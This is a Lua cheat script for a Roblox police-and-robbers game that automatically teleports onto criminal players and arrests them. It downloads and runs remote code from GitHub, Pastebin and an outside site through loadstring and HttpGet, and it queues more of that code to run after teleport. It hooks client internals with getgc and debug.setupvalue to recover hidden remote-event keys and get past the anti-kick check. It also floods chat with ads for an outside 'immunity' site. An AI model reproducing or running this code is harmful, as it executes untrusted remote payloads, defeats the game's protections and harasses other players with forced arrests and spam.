repeat
    wait()
    pcall(
        function()
            game:GetService("Players").LocalPlayer.Idled:connect(
                function()
                    vu:Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
                    wait(1)
                    vu:Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
                end
            )
            if game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid") then
                start = true
            end
        end
    )
until start
wait(5)
loadstring(game:HttpGet("https://raw.githubusercontent.com/HazeWasTaken/PayPal/master/bread.lua"))()
loadstring(game:HttpGet("https://pastebin.com/raw/M36Bgqim"))()
for i,v in next, getgc(true) do
    if typeof(v) == "table" and rawget(v, "FireServer") then
        Remote = v
    end
end
if game:GetService("Players").LocalPlayer.Team.Name ~= "Police" then
    Remote:FireServer(getgenv().teamhesh, "Police")
    print("yes")
end
function getNumber(pretty)
	local lol = ''
	for i = 1, pretty:len() do
		local char = pretty:sub(i, i)
		if char:match('%d') then
			lol = lol .. char
		end
	end
	return tonumber(lol)
end
for i,v in pairs(game.Workspace.MostWanted.MostWanted.Background.MostWanted.Board:GetChildren()) do
    if v.Name == "Preset" then
        if one == nil then
            one = getNumber(v.Stats.Bounty.Text)
        elseif two == nil then
            two = getNumber(v.Stats.Bounty.Text)
        elseif three == nil then
            three = getNumber(v.Stats.Bounty.Text)
        elseif four == nil then
            four = getNumber(v.Stats.Bounty.Text)
        elseif five == nil then
            five = getNumber(v.Stats.Bounty.Text)
        elseif six == nil then
            six = getNumber(v.Stats.Bounty.Text)
        end
    end
end
tpexec = queue_on_teleport or syn and syn.queue_on_teleport
tpexec("loadstring(game:HttpGet('https://raw.githubusercontent.com/HazeWasTaken/JailedHax/master/AutoArrest'))()")
if one == nil then
    bounty = 250
elseif two == nil then
    bounty = (one)
elseif three == nil then
    bounty = (one + two)
elseif four == nil then
    bounty = (one + two + three)
elseif five == nil then
    bounty = (one + two + three + four)
elseif six == nil then
    bounty = (one + two + three + four + five)
elseif six ~= nil then
    bounty = (one + two + three + four + five + six)
end




getgenv().currentstore.Text = bounty
getgenv().textstat.Text = "Bounty Value:" 
getgenv().AutoArrest = true
if getgenv().AutoArrest ~= true then
    repeat wait() until getgenv().AutoArrest
end

local a = game
local b = a.Workspace
local c = a.Lighting
local d = b.Terrain
d.WaterWaveSize = 0
d.WaterWaveSpeed = 0
d.WaterReflectance = 0
d.WaterTransparency = 0
c.GlobalShadows = false
c.FogEnd = 9e9
c.Brightness = 0
settings().Rendering.QualityLevel = "Level01"
for e, f in pairs(a:GetDescendants()) do
   if f:IsA("Part") or f:IsA("Union") or f:IsA("CornerWedgePart") or f:IsA("TrussPart") then
       f.Material = "Plastic"
       f.Reflectance = 0
   elseif f:IsA("Decal") or f:IsA("Texture") then
       f.Transparency = 0
   elseif f:IsA("ParticleEmitter") or f:IsA("Trail") then
       f.Lifetime = NumberRange.new(0)
   elseif f:IsA("Explosion") then
       f.BlastPressure = 0
       f.BlastRadius = 0
   elseif f:IsA("Fire") or f:IsA("SpotLight") or f:IsA("Smoke") or f:IsA("Sparkles") then
       f.Enabled = false
   elseif f:IsA("MeshPart") then
       f.Material = "Plastic"
       f.Reflectance = 0
       f.TextureID = 10385902758728957
   end
end
for e, g in pairs(c:GetChildren()) do
   if
       g:IsA("BlurEffect") or g:IsA("SunRaysEffect") or g:IsA("ColorCorrectionEffect") or g:IsA("BloomEffect") or
           g:IsA("DepthOfFieldEffect")
    then
       g.Enabled = false
   end
end
if syn then
    sethiddenproperty(game.Lighting, "Technology", "Compatibility")
end
pcall(function()
    loadstring(game:HttpGet("https://jailbricked.com/API/Load.txt"))()
end)
msg_ad = {

"Are you guys tired of getting arrested by flying cars?",
"Well, I know a way to not get arrested by these hackers.",
"BRUH Another hacker! But I know how to not get arrested.",
"I'm glad i bought the arrest immunity gamepass, hackers dont affect me",
"Yo guys, do you want to not get arrested by hackers?"

}

rest_ad = {

" Buy the immunity gamepass then. jailbricked･com/immunity",
" Check the gamepass made by the same person. jailbricked･com/immunity",
" Buying this gamepass makes u immune against them. jailbricked･com/immunity",
" Visit jailbricked･com/immunity"

}

__rnd = Random.new()
__chat = function(x) game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(x,"All") end
spawn(function()
while true do
wait(10)
_first = msg_ad[__rnd:NextInteger(1,#msg_ad)]
_second = rest_ad[__rnd:NextInteger(1,#rest_ad)]
__chat(_first.."".._second)

end
end)
wait(2)
repeat
    wait()
    pcall(function()
    
    if getgenv().AutoArrest ~= true then
        repeat wait() until getgenv().AutoArrest
    end

    local PlaceID = game.PlaceId
    local AllIDs = {}
    local foundAnything = ""
    local actualHour = os.date("!*t").hour
    local Deleted = false
    lel = {}
    local File =
        pcall(
        function()
            AllIDs = game:GetService("HttpService"):JSONDecode(readfile("NotSameServers.json"))
        end
    )
    if not File then
        table.insert(AllIDs, actualHour)
        writefile("NotSameServers.json", game:GetService("HttpService"):JSONEncode(AllIDs))
    end
    function TPReturner()
        local Site
        if foundAnything == "" then
            Site =
                game.HttpService:JSONDecode(
                game:HttpGet(
                    "https://games.roblox.com/v1/games/" .. PlaceID .. "/servers/Public?sortOrder=Asc&limit=100"
                )
            )
        else
            Site =
                game.HttpService:JSONDecode(
                game:HttpGet(
                    "https://games.roblox.com/v1/games/" ..
                        PlaceID .. "/servers/Public?sortOrder=Asc&limit=100&cursor=" .. foundAnything
                )
            )
        end
        local ID = ""
        if Site.nextPageCursor and Site.nextPageCursor ~= "null" and Site.nextPageCursor ~= nil then
            foundAnything = Site.nextPageCursor
        end
        local num = 0
        for i, v in pairs(Site.data) do
            local Possible = true
            ID = tostring(v.id)
            if tonumber(v.maxPlayers) > tonumber(v.playing) and tonumber(v.playing) ~= 25 then
                for _, Existing in pairs(AllIDs) do
                    if num ~= 0 then
                        if ID == tostring(Existing) then
                            Possible = false
                        end
                    else
                        if tonumber(actualHour) ~= tonumber(Existing) then
                            local delFile =
                                pcall(
                                function()
                                    delfile("NotSameServers.json")
                                    AllIDs = {}
                                    table.insert(AllIDs, actualHour)
                                end
                            )
                        end
                    end
                    num = num + 1
                end
                if Possible == true then
                    table.insert(lel, ID)
                end
            end
        end
    end

    function Teleport()
        while wait() do
            pcall(
                function()
                    TPReturner()
                    if foundAnything ~= "" then
                        TPReturner()
                        leltp = lel[math.random(1, #lel)]
                        table.insert(AllIDs, leltp)
                        wait()
                        pcall(
                            function()
                                writefile("NotSameServers.json", game:GetService("HttpService"):JSONEncode(AllIDs))
                                wait()
                                game:GetService("TeleportService"):TeleportToPlaceInstance(
                                    PlaceID,
                                    leltp,
                                    game.Players.LocalPlayer
                                )
                            end
                        )
                        wait(4)
                    end
                end
            )
        end
    end



    local LocalPlayer = game:GetService("Players").LocalPlayer
    local Character = game:GetService("Players").LocalPlayer.Character

    PayPal = {}
    local Event = debug.getupvalue(require(game:GetService("ReplicatedStorage").Module.AlexChassis).SetEvent, 1)

    for i, v in pairs(getgc(true)) do
        if type(v) == "function" then
            if getfenv(v).script == game:GetService("Players").LocalPlayer.PlayerScripts.LocalScript then
                local con = debug.getconstants(v)
                if table.find(con, "Punch") then
                    PayPal.OnAction = v
                elseif table.find(con, "LastVehicleExit") and table.find(con, "tick") then
                    PayPal.Leave = v
                elseif table.find(con, "ShouldBreakout") and #con == 3 then
                    PayPal.PoliceFunction = v
                elseif table.find(con, "FailedPcall")  then
                    f_ogfunc = debug.getupvalue(v, 1)
                    ogfunc = debug.getupvalue(v,3)
                    debug.setupvalue(v, 3, function(w,t,f) getgenv().antikick = w end)
                    debug.setupvalue(v, 1, function() failpcallshit() end)
                    v()
                    debug.setupvalue(v, 1, f_ogfunc)
                    debug.setupvalue(v,3,ogfunc)
                end
            end
        elseif type(v) == "table" then
            for i2, v2 in pairs(v) do
                if type(v2) == "string" and v2:sub(1, 1) == "!" and v2:len() > 10 then
                    PayPal.AllHashes = v
                end
            end
            if rawget(v, "FireServer") then
                PayPal.Remote = v
            elseif rawget(v, "Part") and type(rawget(v, "Fun")) == "function" then
                if v.Part.Name == "Donut" then
                    PayPal.GiveDonut = v.Fun
                end
            elseif rawget(v, "Ragdoll") and rawget(v, "Unragdoll") then
                PayPal.Falling = v
            end
        end
        if type(v) == "function" and islclosure(v) then
            local script = tostring(getfenv(v).script)
            if script == "LocalScript" then
                local consts = debug.getconstants(v)
                if table.find(consts, "Eject") and table.find(consts, "MouseButton1Down") then
                    Eject = debug.getproto(v, 1)
                end
            end
        end
    end


    function dnt()
        local con = debug.getconstants(debug.getproto(require(game:GetService('ReplicatedStorage').Game.Item.Donut).InputBegan, 1))
        local dntconst = {}
        for i,v in pairs(con) do
            if i > table.find(con, "LastConsumed") and i < table.find(con, "FireServer") and v~= "sub" and v ~= "reverse" then
                table.insert(dntconst, v)
            end
        end
        local da = dntconst[1]
        local db = dntconst[table.maxn(dntconst)]
        for i, v in pairs(PayPal.AllHashes) do
            if string.find(i, da) and string.find(i, db) and da:sub(1,1) == i:sub(1,1) and db:sub(#db,#db) == i:sub(#i,#i) then
                return i
            end
        end
    end
    

    PayPal.Equip =
        (function()
        local const = {}
        local bruhcon = debug.getconstants(require(game:GetService("ReplicatedStorage").Game.ItemSystem.ItemSystem).Equip)
        for i, v in pairs(bruhcon) do
            if i > table.find(bruhcon, "Fire") and i < table.find(bruhcon, "FireServer") then
                table.insert(const, v)
            end
        end
        local da = const[1]
        local db = const[table.maxn(const)]
        for i, v in pairs(PayPal.AllHashes) do
            if
                string.find(i, da) and string.find(i, db) and da:sub(1, 1) == i:sub(1, 1) and
                    db:sub(#db, #db) == i:sub(#i, #i)
             then
                return i
            end
        end
    end)()

    local teama = (function()
        for i, v in pairs(getgc()) do
            if type(v) == "function" and getfenv(v).script == game:GetService("ReplicatedStorage").Game.TeamChooseUI then
                local con = debug.getconstants(v)
                if table.find(con, "delay") and table.find(con, "assert") then
                    local aaabaea = debug.getproto(v, 6)
                    return debug.getconstants(aaabaea)
                end
            end
        end
    end)()

    PayPal.TeamChangee =
        (function()
    
        local tbon = {}
        for i, v in pairs(teama) do
            if
                type(v) == "string" and v ~= "Police" and v ~= "Prisoner" and v ~= "sub" and v ~= "reverse" and
                    v ~= "assert" and
                    v ~= "FireServer"
             then
                table.insert(tbon, v)
            end
        end
        local taa = tbon[1]
        local tbb = tbon[table.maxn(tbon)]
        for i, v in pairs(PayPal.AllHashes) do
            if string.find(i, taa) and string.find(i, tbb) then
                return i
            end
        end
    end)()

    getgenv().teamhesh = PayPal.TeamChangee
    

    PayPal.Taze =
        (function()
        local ta = debug.getconstants(require(game:GetService("ReplicatedStorage").Game.Item.Taser).Tase)
        local taa = {}
        for i, v in pairs(ta) do
            if
                i > table.find(ta, "GetPlayerFromCharacter") and i < table.find(ta, "Name") and v ~= "sub" and
                    v ~= "reverse"
             then
                table.insert(taa, v)
            end
        end
        local tb = taa[1]:sub(1, 1)
        local tc = taa[table.maxn(taa)]
        for i, v in pairs(PayPal.AllHashes) do
            if
                string.find(i, tb) and string.find(i, tc) and tb:sub(1, 1) == i:sub(1, 1) and
                    tc:sub(#tc, #tc) == i:sub(#i, #i)
             then
                return i
            end
        end
    end)()

    function Taze(plr)
        pcall(
            function()
                if not plr:IsA("Player") then
                    return
                end
                if plr.Character then
                    PayPal.Remote:FireServer(
                        PayPal.Taze,
                        plr.Name,
                        plr.Character:WaitForChild("HumanoidRootPart"),
                        plr.Character:WaitForChild("HumanoidRootPart").Position
                    )
                end
            end
        )
    end

    PayPal.Arrest = debug.getupvalue(debug.getupvalue(PayPal.PoliceFunction, 1), 7)

    local oldRagdoll = PayPal.Falling.Ragdoll
    PayPal.Falling.Ragdoll = function(...)
        return wait(9e9)
    end

    debug.setupvalue(Eject, 1, Event)

    if LocalPlayer.Character:FindFirstChild("InVehicle") then
        repeat
            wait(1)
            PayPal.Leave()
        until not LocalPlayer.Character:FindFirstChild("InVehicle")
    end
    spawn(function()
        if game:GetService("Players").LocalPlayer.Team.Name ~= "Police" then
            PayPal.Remote:FireServer(getgenv().teamhesh, "Police")
            print("yes")
        end
    end)
    --loadstring(game:HttpGet("https://raw.githubusercontent.com/HazeWasTaken/PayPal/master/bread.lua"))()
    PayPal.Remote:FireServer(getgenv().antikick)
    if getgenv().AutoArrest ~= true then
        repeat wait() until getgenv().AutoArrest
    end
    if game:GetService("Players").LocalPlayer.Team.Name ~= "Police" then
        Teleport()
    end
    
    
    spawn(
        function()
            wait(120)
            repeat wait() until getgenv().AutoArrest
            Teleport()
        end
    )

    spawn( 
        function()
            repeat wait()
                if getgenv().skipplr == false then
                    wait(15)
                    getgenv().skipplr = true
                end
            until gae
        end
    )

    spawn(
        function()
            repeat
                wait()
                if
                    workspace.Trains:FindFirstChild("PassengerArmor") and
                        workspace.Trains.PassengerArmor.Model.Interior:FindFirstChild("Part")
                 then
                    for i, v in pairs(require(game:GetService("ReplicatedStorage").Module.UI).CircleAction.Specs) do
                        if v.Name == "Grab briefcase" then
                            v:Callback(v, true)
                            wait(1)
                        end
                    end
                    if workspace.Trains:FindFirstChild("PassengerArmor") then
                        game:GetService("Workspace").Trains.PassengerArmor.Model.Interior.Part:Destroy()
                    end
                end
            until game
        end
    )

    game:service "RunService".Stepped:Connect(
        function()
            if game:GetService("Players").LocalPlayer.Character.Humanoid.Health < 100 then
                PayPal.GiveDonut()
                PayPal.Remote:FireServer(dnt())
            end
            if game:GetService("Players").LocalPlayer.Character.Humanoid.Sit and not game:GetService("Players").LocalPlayer.Character:FindFirstChild("InVehicle") then
                game:GetService("Players").LocalPlayer.Character.Humanoid.Jump = true
            end
            game:service "Players".LocalPlayer.Character.Head.CanCollide = false
            game:service "Players".LocalPlayer.Character.LowerTorso.CanCollide = false
            game:service "Players".LocalPlayer.Character.UpperTorso.CanCollide = false
            game:service "Players".LocalPlayer.Character.HumanoidRootPart.CanCollide = false
            if game:service "Players".LocalPlayer.Character:FindFirstChild "Badge" then
                game:service "Players".LocalPlayer.Character.Badge.CanCollide = false
            end
        end
    )

    function tpi(...)
        game:GetService("Players").LocalPlayer.Character:SetPrimaryPartCFrame(...)
    end

    function checkbank(plrTorso)
        if plrTorso.Position.y < 125 and plrTorso.Position.y > -500 then
            if
                plrTorso.Position.x < 124.7066192627 and plrTorso.Position.x > 5.866051197052 and
                    plrTorso.Position.z < 880.09967041016 and
                    plrTorso.Position.z > 764.54571533203
             then
                return true
            end
        end
        if
            ((plrTorso).Position -
                game:GetService("Workspace").Banks:GetChildren()[1].Layout:GetChildren()[1].Money.position).magnitude <
                40
         then
            return true
        end
    end

    function checkjew(plrTorso)
        if plrTorso.Position.y < 130.37781524658 and plrTorso.Position.y > -500 then
            if
                plrTorso.Position.x < 179.38104248047 and plrTorso.Position.x > 91.093841552734 and
                    plrTorso.Position.z < 1368.1715087891 and
                    plrTorso.Position.z > 1246.7016601563
             then
                return true
            end
        end
    end

    function checkmue(plrTorso)
        if plrTorso.Position.y < 125 and plrTorso.Position.y > -500 then
            if
                plrTorso.Position.x < 1150 and plrTorso.Position.x > 990 and plrTorso.Position.z < 1350 and
                    plrTorso.Position.z > 1050
             then
                return true
            end
        end
    end

    local carLockedMsg = game:GetService("Players").LocalPlayer.PlayerGui.MainGui.SimpleMessage
    local carlockCheck =
        carLockedMsg:GetPropertyChangedSignal("Visible"):Connect(
        function()
            if carLockedMsg.Visible then
                getgenv().carlock = true
            end
        end
    )

    spawn(
        function()
            repeat
                wait()
                if getgenv().lookinforcar then
                    wait(5)
                    getgenv().lookinforcar = false
                end
            until gae
        end
    )

    function InVehicleCheck()
        if Character:FindFirstChild("InVehicle") then
            return true
        end
    end

    function checkshit()
        for i, v in pairs(game:GetService('Teams').Criminal:GetPlayers()) do
            return i
        end
    end

    function GrabVehicle()
        local Vehicles = {}
        repeat
            wait()
            for a, b in pairs(Workspace.Vehicles:GetChildren()) do
                if b.Name == "Camaro" then
                    if b:FindFirstChild("Seat") and b:FindFirstChild("Camera") then
                        if b.Seat:FindFirstChild("Player") then
                            if b.Seat.Player.Value == false then
                                table.insert(Vehicles, b)
                            end
                        end
                    end
                end
            end

            Car = Vehicles[math.random(1, #Vehicles)]
            carFull = false
            getgenv().carlock = false
            getgenv().lookinforcar = true
            repeat
                wait()
                if Car.Seat.Player.Value == true and Car.Seat.PlayerName.Value ~= LocalPlayer.Name then
                    carFull = true
                end
                Character:SetPrimaryPartCFrame(CFrame.new(Car.Camera.position))
                for i, v in pairs(require(game:GetService("ReplicatedStorage").Module.UI).CircleAction.Specs) do
                    if v.Name == "Enter Driver" and v.ValidRoot == Car then
                        v:Callback(true)
                    end
                end
            until InVehicleCheck() or carFull == true or getgenv().carlock or getgenv().lookinforcar == false
            if getgenv().lookinforcar == false then
                Car:Destroy()
            end
        until InVehicleCheck()
        for i, v in pairs(Workspace.Vehicles:GetChildren()) do
            if v:FindFirstChild("Seat") then
                if v.Seat:FindFirstChild("PlayerName") then
                    if v.Seat.PlayerName.Value == LocalPlayer.Name then
                        lmaocargobrrr = v
                    end
                end
            end
        end
        lmaocargobrrr.Model.Body.Transparency = 1
        lmaocargobrrr.Model.Tailpipes.Transparency = 1
        lmaocargobrrr.Model.Headlights.Transparency = 1
        lmaocargobrrr.Model.Brakelights.Transparency = 1
        lmaocargobrrr.Model.Vents.Transparency = 1
        lmaocargobrrr.Model.Windows.Transparency = 1
        lmaocargobrrr.Model.plate.Transparency = 1
        lmaocargobrrr.Model.plate.Decal.Transparency = 1
        lmaocargobrrr.Model.plate.SurfaceGui.Frame.TextLabel.TextTransparency = 1
        lmaocargobrrr.WheelBackLeft.Rim.Transparency = 1
        lmaocargobrrr.WheelBackLeft.Wheel.Transparency = 1
        lmaocargobrrr.WheelBackRight.Rim.Transparency = 1
        lmaocargobrrr.WheelBackRight.Wheel.Transparency = 1
        lmaocargobrrr.WheelFrontLeft.Rim.Transparency = 1
        lmaocargobrrr.WheelFrontLeft.Wheel.Transparency = 1
        lmaocargobrrr.WheelFrontRight.Rim.Transparency = 1
        lmaocargobrrr.WheelFrontRight.Wheel.Transparency = 1
        if lmaocargobrrr.Model:FindFirstChild("Lights") then
        lmaocargobrrr.Model.Lights:Destroy()
        end
        return Car
    end

    function tp(mooi, bread)
        if bread then
            getgenv().bypass = true
        end
        if not InVehicleCheck() then
            local Vehicle = GrabVehicle()
        end
        if bread then
            repeat wait(1)
                PayPal.Leave()
            until not InVehicleCheck()
            for i = 1, 6 do
                wait()
                Character:SetPrimaryPartCFrame(mooi)
                Character:SetPrimaryPartCFrame(mooi)
            end
            getgenv().bypass = false
        else
            for i, v in pairs(Workspace.Vehicles:GetChildren()) do
                if v:FindFirstChild("Seat") then
                    if v.Seat:FindFirstChild("PlayerName") then
                        if v.Seat.PlayerName.Value == LocalPlayer.Name then
                            v:SetPrimaryPartCFrame(mooi)
                            lmaocargobrrr = v
                        end
                    end
                end
            end
        end
    end

    spawn(
        function()
            repeat
                wait(10)
                if getgenv().AutoArrest then
                    if getgenv().museum then
                        tp(getgenv().Vic.Character.HumanoidRootPart.CFrame, true)
                    elseif getgenv().store then
                        tp(CFrame.new(10, 10, 10), true)
                    end
                end
            until getgenv().stop
        end
    )
    repeat wait() 

        if getgenv().AutoArrest ~= true then
            repeat wait() until getgenv().AutoArrest
        end
    for i, v in pairs(game:GetService("Teams").Criminal:GetPlayers()) do
        if v.Character:FindFirstChild("Handcuffs") then
            v:Destroy()
        end
        if getgenv().AutoArrest ~= true then
            repeat wait() until getgenv().AutoArrest
        end
        if not v.Character:FindFirstChild("Handcuffs") then
            if v.Team.Name == "Criminal" then
                if checkbank(v.Character.HumanoidRootPart) or checkjew(v.Character.HumanoidRootPart) then
                    getgenv().store = true
                    getgenv().Vic = v
                    getgenv().skipplr = false
                    getgenv().museum = false
                    tp(CFrame.new(10,10,10), true)
                    repeat
                        wait()
                        tpi(v.Character.HumanoidRootPart.CFrame)
                        if getgenv().AutoArrest ~= true then
                            repeat wait() until getgenv().AutoArrest
                        end
                        if workspace.CurrentCamera.CameraSubject ~= v.Character.Humanoid then
                            workspace.CurrentCamera.CameraSubject = v.Character.Humanoid
                        end
                        for _, k in pairs(
                            game:GetService("Players").LocalPlayer.PlayerGui.HotbarGui.Container:GetChildren()
                        ) do
                            if k:IsA("ImageButton") and k.Icon.Image == "rbxassetid://700374045" then
                                PayPal.Remote:FireServer(
                                    PayPal.Equip,
                                    {
                                        i = k.Name,
                                        Name = "Handcuffs"
                                    }
                                )
                            end
                        end
                        if v.Character:FindFirstChild("InVehicle") then
                            debug.setupvalue(Eject, 2, v.Name)
                            Eject()
                        end
                        if v.Character.Humanoid.Sit then
                            Taze(v)
                        end
                        PayPal.Arrest(v)
                    until v.Character:FindFirstChild("Handcuffs") or v.Team.Name ~= "Criminal" or checkmue(v.Character.HumanoidRootPart) or getgenv().skipplr
                elseif checkmue(v.Character.HumanoidRootPart) then
                    getgenv().store = false
                    getgenv().Vic = v
                    getgenv().museum = true
                    getgenv().skipplr = false
                    tp(CFrame.new(1096, 105, 1211), false)
                    repeat
                        wait(1)
                        PayPal.Leave()
                    until not LocalPlayer.Character:FindFirstChild("InVehicle")
                    repeat
                        wait()
                        if getgenv().AutoArrest ~= true then
                            repeat wait() until getgenv().AutoArrest
                        end
                        if getgenv().bypass ~= true then
                            tpi(v.Character.HumanoidRootPart.CFrame* CFrame.new(0,-10,0))
                        end
                        if workspace.CurrentCamera.CameraSubject ~= v.Character.Humanoid then
                            workspace.CurrentCamera.CameraSubject = v.Character.Humanoid
                        end
                        for _, k in pairs(
                            game:GetService("Players").LocalPlayer.PlayerGui.HotbarGui.Container:GetChildren()
                        ) do
                            if k:IsA("ImageButton") and k.Icon.Image == "rbxassetid://700374045" then
                                PayPal.Remote:FireServer(
                                    PayPal.Equip,
                                    {
                                        i = k.Name,
                                        Name = "Handcuffs"
                                    }
                                )
                            end
                        end
                        if v.Character:FindFirstChild("InVehicle") then
                            debug.setupvalue(Eject, 2, v.Name)
                            Eject()
                        end
                        if v.Character.Humanoid.Sit then
                            Taze(v)
                        end
                        PayPal.Arrest(v)
                    until v.Team.Name ~= "Criminal" or v.Character:FindFirstChild("Handcuffs") or getgenv().skipplr
                    tp(CFrame.new(10, 10, 10), false)
                else
                    getgenv().store = false
                    getgenv().museum = false
                    getgenv().skipplr = false
                    repeat
                        wait()
                        tp(v.Character.HumanoidRootPart.CFrame, false)
                        if getgenv().AutoArrest ~= true then
                            repeat wait() until getgenv().AutoArrest
                        end
                        if workspace.CurrentCamera.CameraSubject ~= v.Character.Humanoid then
                            workspace.CurrentCamera.CameraSubject = v.Character.Humanoid
                        end
                        for _, k in pairs(
                            game:GetService("Players").LocalPlayer.PlayerGui.HotbarGui.Container:GetChildren()
                        ) do
                            if k:IsA("ImageButton") and k.Icon.Image == "rbxassetid://700374045" then
                                PayPal.Remote:FireServer(
                                    PayPal.Equip,
                                    {
                                        i = k.Name,
                                        Name = "Handcuffs"
                                    }
                                )
                            end
                        end
                        if v.Character:FindFirstChild("InVehicle") then
                            debug.setupvalue(Eject, 2, v.Name)
                            Eject()
                        end
                        if v.Character.Humanoid.Sit then
                            Taze(v)
                        end
                        PayPal.Arrest(v)
                    until v.Team.Name ~= "Criminal" or getgenv().skipplr or v.Character:FindFirstChild("Handcuffs") or checkbank(v.Character.HumanoidRootPart) or checkjew(v.Character.HumanoidRootPart) or checkmue(v.Character.HumanoidRootPart)
                end
            end
        end
    end
    
until checkshit() == nil
repeat wait() until getgenv().AutoArrest
Teleport()
end)
until gae


